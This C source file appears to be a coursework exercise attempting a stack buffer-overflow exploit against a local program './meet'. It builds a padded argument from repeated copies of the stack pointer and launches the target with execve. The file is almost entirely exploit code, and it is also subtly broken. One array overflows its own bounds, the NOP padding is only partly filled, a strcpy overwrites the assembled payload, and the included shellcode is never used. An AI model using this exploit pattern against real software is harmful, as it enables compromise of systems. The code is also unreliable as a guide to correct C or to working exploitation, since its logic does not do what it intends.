#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

//#define TARGET "/tmp/target0"
#define TARGET "./meet"

unsigned long get_sp(void)
{
	__asm__("movl %esp, %eax");
}

unsigned char *getByteArrayFromLong(unsigned long longInt) 
{
	unsigned char *byteArray = malloc(sizeof(char) * 4);

	// convert from an unsigned long int to a 4-byte array
	byteArray[0] = (int)((longInt >> 24) & 0xFF) ;
	byteArray[1] = (int)((longInt >> 16) & 0xFF) ;
	byteArray[2] = (int)((longInt >> 8) & 0XFF);
	byteArray[3] = (int)((longInt & 0XFF));

	return byteArray;
}

int main(void)
{
	char *args[3]; 
	char *env[1];
	int index = 0;
	int A1 = 203;
	int A2 = 38;

	char part1[203] = {"\x90"};
	unsigned char part2[A2];

	unsigned char *esp = getByteArrayFromLong(get_sp());
	
	for(int j = 0; j < 4*A2; j+=4)
	{
		part2[j+0] = esp[3];
		part2[j+1] = esp[2];
		part2[j+2] = esp[1];
		part2[j+3] = esp[0];
	}

	printf("Check: part 1 %s\n", part1);
	printf("Check: part 2 %s\n", part2);
	printf("Check: esp %s\n", esp);
	char * str3 = (char *) malloc(1 + strlen(part1)+ strlen(part2)+ strlen(esp) );
	args[0] = TARGET;
	strcpy(str3, part1);
        strcat(str3, esp);
	strcpy(str3, part2);
	args[1] = str3; 
	args[2] = NULL;

	env[0] = NULL;
	execve(TARGET, args, env);
	printf("Check: %s", str3);
	fprintf(stderr, "execve failed.\n");

	return 0;
}
